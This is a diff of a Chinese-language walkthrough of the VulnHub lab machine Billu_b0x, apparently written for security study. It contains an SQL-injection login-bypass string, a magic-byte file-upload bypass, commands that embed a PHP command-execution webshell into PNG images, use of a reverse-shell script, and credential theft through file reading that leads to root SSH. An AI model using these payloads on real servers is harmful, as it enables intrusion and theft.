@@ -148,10 +148,91 @@ select * from auth where pass=  '\' and uname='  or 1=1 #\'
 
 在panel.php界面中，点击复选框中的 add 选项。出现上传功能界面。
 
-![[kali-linux-2026.1-vmware-amd64-2026-07-27-22-39-04.png]]
+![page](../vulnhubScreenShot/Billux_b0x/kali-linux-2026.1-vmware-amd64-2026-07-27-22-39-04.png)
 
 查看源码
-![[file_upload.png]]
-这里查阅 php 手册后发现pathinfo函数会根据文件名和指定flags 类型返回相应的字符串，这里PATHINFO_EXITENSION 是文件后缀的意思。所以这个函数会返回上传文件的后缀名。下面通过finfo 类的接口调用 file 函数返回文件内容类型。
-总的来说， 后端检查文件上传不仅会看后缀字符是否匹配，还会看提交的内容是不是图片。
-二次渲染，shell成鬼shell问题
+
+![upload_file](../vulnhubScreenShot/Billux_b0x/file_upload.png)
+
+这里查阅 php 手册后发现pathinfo函数会根据文件名和指定flags 类型返回相应的字符串，这里PATHINFO_EXITENSION 是文件后缀的意思。所以这个函数会返回上传文件的后缀名。下面通过finfo 类的接口调用 file 函数返回文件内容类型。finfo 类是通过查看图片的 "魔数" 来判断是不是图片。比如 “PNG” 这块就是 2.png 的魔数。
+
+![picture](../vulnhubScreenShot/Billux_b0x/2026-07-27-225441_2560x1600_scrot.png)
+
+总的来说， 后端检查文件上传不仅会看后缀字符是否匹配，还会看提交的内容是不是图片。后端校验逻辑中，没有把上传的图片进行压缩或者渲染。我们可以直接添加一个 GIF 的魔数头(GIF89a)，并且在后面添加 WEBSHELL 代码，更改后缀为 .php。
+
+笔者使用的是 kali 自带的 webshells 工具 php-reverse-shell.php。上传大马获得shell。
+
+![big-shell](../vulnhubScreenShot/Billux_b0x/big-shell.png)
+
+这里更推荐使用图片马上传。
+
+## 图片马配合解析漏洞获得 shell 会话
+
+_图片马尽量选择占用磁盘体积小的照片。太大了，很可能导致执行不成功。_
+
+1. 图片尾部插入一句话
+	我们可以添加一句话木马到图片的后面。
+	添加到图片末尾
+	```shell
+	convert -size 10x10 xc:white tiny2.png
+	// 生成一个标准的png文件
+	echo "<?php system(\$_GET['retro']);?>" >> tiny2.png
+	// 使用 \ 转义美元符 避免 zsh 解析$_GET['retro']
+	xxd tiny2.png
+	// 查看图片马是否写入成功
+	```
+
+	![tiny2](../vulnhubScreenShot/Billux_b0x/tiny2_000.png)
+
+	测试结果
+
+	![RES1](../vulnhubScreenShot/Billux_b0x/Screenshot_2026-07-28_04_11_21.png)
+	
+	![res2](../vulnhubScreenShot/Billux_b0x/Screenshot_2026-07-28_04_11_32.png)
+	如果连接参数的结果返回失败，那么考虑是否忘记进行 url 编码。
+
+
+2. 图片内部辅助块插入一句话
+
+	 同样使用 convert 生成一张标准的 png 图片。
+	 
+	 ```shell
+	 convert -size 10x10 xc:white tiny1.png
+	 
+	 exiftool -comment="<?php system(\$_GET['retro']);?>" tiny1.png
+	 
+	 exiftool tiny1.png
+	 ```
+
+	一句话木马插入到comment中。
+	![tiny_exiftool](../vulnhubScreenShot/Billux_b0x/tiny_ps.png)
+
+	![ls](../vulnhubScreenShot/Billux_b0x/Screenshot_2026-07-28_04_35_08.png)
+
+	![whoami](../vulnhubScreenShot/Billux_b0x/Screenshot_2026-07-28_04_35_23.png)
+
+	 和第一种方式略有区别，结果回显位置不同。
+
+
+
+3. 两种方式的异同
+	 相同的地方在在于都只能在服务器不二次处理图片的情况下进行。如果服务器接收到图片后进行压缩编码。那么这两种暴力的方法都会失效。比如 _PHP-GD imagepng ()_ ，这时可以考虑 _IDAT_ 注入。
+
+	不同的地方在于，方法 2 是写入 png 中的 tEXt 区块。方法1 是写入 png 的 IEND 标记后面，图片解析到IEND 就结束了。所以方法 1 执行的结果会被放到图片数据的最后面。而方法2 会把执行的结果放到数据中。
+
+
+# 权限提升
+
+在查找的过程中，发现网站目录下，有个 phpmy 的文件夹。推测网站可能运行 phpmyadmin 这样的软件。我们使用 GitHub 上面的 [Auto_wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt) 这个库, 找到phpMyAdmin 的配置文件为 config.inc.php。使用文件读取漏洞读取敏感信息。
+
+![root](../vulnhubScreenShot/Billux_b0x/root.png)
+
+我们现在猜想这个 phpMyAdmin 的登录密码是不是就是ssh的登录密码。结果证明确实是这样！
+
+![rootssh](../vulnhubScreenShot/Billux_b0x/kali-linux-2026.1-vmware-amd64-2026-07-28-17-32-30.png)
+
+至此，这台靶机渗透结束。
+
+# 总结
+
+这台靶机聚焦考察 WEB 的几个经典漏洞。笔者最大的感受是，“看上去很简单，但实际操作起来没想象的那么容易”。还是要对漏洞原理深刻理解，不能只记套路。
